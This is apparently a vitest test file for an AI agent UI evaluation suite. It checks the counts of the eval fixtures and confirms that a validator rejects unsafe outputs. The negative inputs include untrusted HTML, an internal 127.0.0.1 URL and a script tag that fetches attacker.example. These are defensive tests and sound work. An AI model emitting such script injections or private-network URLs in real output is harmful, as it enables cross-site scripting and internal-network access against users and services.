import { describe, expect, it } from "vitest";
import { LIMITS, TRUSTED_COMPONENT_NAMES } from "@shared/constants.js";
import { validateSurfaceSpec } from "@shared/surface-validation.js";
import type { SurfaceNode, SurfaceSpec } from "@shared/schemas.js";
import { CATEGORY_COUNTS, EVAL_CASES } from "./cases.js";
import { buildCanonicalResult, validateEvalResult } from "./contract.js";

describe("Agent UI Lab evaluation fixtures", () => {
  it("contains exactly 40 uniquely identified prompts in the approved category mix", () => {
    expect(EVAL_CASES).toHaveLength(40);
    expect(new Set(EVAL_CASES.map((testCase) => testCase.id)).size).toBe(40);

    const actualCounts = Object.fromEntries(
      Object.keys(CATEGORY_COUNTS).map((category) => [
        category,
        EVAL_CASES.filter((testCase) => testCase.category === category).length,
      ]),
    );

    expect(actualCounts).toEqual(CATEGORY_COUNTS);
  });

  it("declares only trusted component expectations within the shared budgets", () => {
    const trusted = new Set<string>(TRUSTED_COMPONENT_NAMES);

    for (const testCase of EVAL_CASES) {
      expect(testCase.expected.requiredComponents.length).toBeLessThanOrEqual(LIMITS.surfaceNodes);
      for (const component of [
        ...testCase.expected.requiredComponents,
        ...testCase.expected.forbiddenComponents,
      ]) {
        expect(trusted.has(component), `${testCase.id}: ${component} is not trusted`).toBe(true);
      }
    }
  });

  it("requires citation IDs for every research-grounded fixture", () => {
    const researchCases = EVAL_CASES.filter((testCase) => testCase.expected.grounding === "research");

    expect(researchCases.length).toBeGreaterThan(0);
    for (const testCase of researchCases) {
      expect(testCase.expected.requireCitationIds, testCase.id).toBe(true);
      expect(testCase.expected.requiredComponents, testCase.id).toContain("SourceList");
    }
  });

  it("requires safe fallback behavior for every high-stakes and unsupported prompt", () => {
    const fallbackCases = EVAL_CASES.filter(
      (testCase) => testCase.category === "high-stakes" || testCase.category === "unsupported",
    );

    expect(fallbackCases).toHaveLength(6);
    for (const testCase of fallbackCases) {
      expect(testCase.expected.responseMode, testCase.id).toBe("safe-fallback");
      expect(testCase.expected.requiredComponents, testCase.id).toContain("TextBlock");
      expect(testCase.expected.grounding, testCase.id).toBe("none");
    }
  });

  it.each(EVAL_CASES)("accepts the semantic canonical result for $id", (testCase) => {
    const candidate = buildCanonicalResult(testCase);

    if (candidate.surface) {
      expect(validateSurfaceSpec(candidate.surface, candidate.sources).success).toBe(true);
    }
    expect(validateEvalResult(testCase, candidate)).toEqual({ success: true, issues: [] });
  });
});

describe("evaluation contract guardrails", () => {
  it("rejects a component outside the trusted catalog", () => {
    const testCase = EVAL_CASES.find((candidate) => candidate.id === "W01")!;
    const result = buildCanonicalResult(testCase);
    const surface = structuredClone(result.surface) as SurfaceSpec;
    const root = surface.components.find((node) => node.id === surface.rootId) as Extract<SurfaceNode, { component: "Band" }>;
    root.children.push("unsafe-html");
    surface.components.push({ id: "unsafe-html", component: "HTML", html: "<b>unsafe</b>" } as unknown as SurfaceNode);

    expect(validateEvalResult(testCase, { ...result, surface }).success).toBe(false);
  });

  it("rejects surfaces that exceed the shared node budget", () => {
    const testCase = EVAL_CASES.find((candidate) => candidate.id === "W01")!;
    const result = buildCanonicalResult(testCase);
    const surface = structuredClone(result.surface) as SurfaceSpec;
    surface.components = Array.from({ length: LIMITS.surfaceNodes + 1 }, (_, index) => ({
      id: `node-${index}`,
      component: "TextBlock",
      text: "Bounded fixture text",
      tone: "default",
    })) as SurfaceNode[];
    surface.rootId = "node-0";

    expect(validateEvalResult(testCase, { ...result, surface }).success).toBe(false);
  });

  it("rejects unknown citation IDs in research output", () => {
    const testCase = EVAL_CASES.find((candidate) => candidate.id === "R01")!;
    const result = buildCanonicalResult(testCase);
    const surface = structuredClone(result.surface) as SurfaceSpec;
    const sourceList = surface.components.find(
      (node) => node.component === "SourceList",
    ) as Extract<SurfaceNode, { component: "SourceList" }>;
    sourceList.sourceIds = ["src_missing1"];

    expect(validateEvalResult(testCase, { ...result, surface }).success).toBe(false);
  });

  it("rejects specialized UI in a high-stakes fallback", () => {
    const testCase = EVAL_CASES.find((candidate) => candidate.id === "H01")!;
    const result = buildCanonicalResult(testCase);
    const surface = structuredClone(result.surface) as SurfaceSpec;
    const root = surface.components.find((node) => node.id === surface.rootId) as Extract<SurfaceNode, { component: "Band" }>;
    root.children.push("unsafe-weather-hero");
    surface.components.push({
      id: "unsafe-weather-hero",
      component: "WeatherHero",
      location: "Raleigh",
      dateLabel: "Now",
      temperature: 95,
      unit: "F",
      condition: "Hot",
      conditionKey: "clear",
      recommendationLabel: "Medical decision",
      recommendationValue: "Wait until tomorrow",
      recommendationDetail: "Unsafe personalized advice",
    });

    expect(validateEvalResult(testCase, { ...result, surface }).success).toBe(false);
  });

  it("rejects HTTPS URLs that target a private network", () => {
    const testCase = EVAL_CASES.find((candidate) => candidate.id === "R01")!;
    const result = buildCanonicalResult(testCase);
    const sources = structuredClone(result.sources);
    sources[0].url = "https://127.0.0.1/internal";

    expect(validateEvalResult(testCase, { ...result, sources }).success).toBe(false);
  });

  it("rejects executable code embedded in otherwise trusted text", () => {
    const testCase = EVAL_CASES.find((candidate) => candidate.id === "S03")!;
    const result = buildCanonicalResult(testCase);
    const surface = structuredClone(result.surface) as SurfaceSpec;
    const text = surface.components.find(
      (node) => node.component === "TextBlock",
    ) as Extract<SurfaceNode, { component: "TextBlock" }>;
    text.text = "<script>fetch('https://attacker.example')</script>";

    expect(validateEvalResult(testCase, { ...result, surface }).success).toBe(false);
  });
});
